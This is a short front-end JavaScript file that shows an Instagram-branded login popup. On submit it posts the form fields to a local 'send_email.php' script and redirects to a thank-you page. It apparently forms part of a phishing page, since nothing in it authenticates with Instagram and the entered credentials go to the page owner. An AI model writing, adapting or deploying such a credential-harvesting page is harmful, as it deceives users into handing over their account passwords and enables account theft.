document.addEventListener('DOMContentLoaded', function() {
    const instagramLoginButton = document.getElementById('instagramLogin');
    const loginPopup = document.getElementById('loginPopup');
    const closeButton = document.querySelector('.close');
    const loginForm = document.getElementById('loginForm');

    instagramLoginButton.addEventListener('click', function() {
        loginPopup.style.display = 'block';
    });

    closeButton.addEventListener('click', function() {
        loginPopup.style.display = 'none';
    });

    window.addEventListener('click', function(event) {
        if (event.target === loginPopup) {
            loginPopup.style.display = 'none';
        }
    });

    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();

        const formData = new FormData(loginForm);

        fetch('send_email.php', {
            method: 'POST',
            body: formData
        })
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            return response.text(); // Change this to text() instead of json()
        })
        .then(text => {
            try {
                const data = JSON.parse(text);
                if (data.success) {
                    loginPopup.style.display = 'none';
                    window.location.href = 'thank-you.html';
                } else {
                    alert('Error: ' + data.message);
                }
            } catch (error) {
                console.error('Error parsing JSON:', error);
                console.error('Received text:', text);
                alert('An error occurred while processing the response.');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred. Please check the console for more details.');
        });
    });
});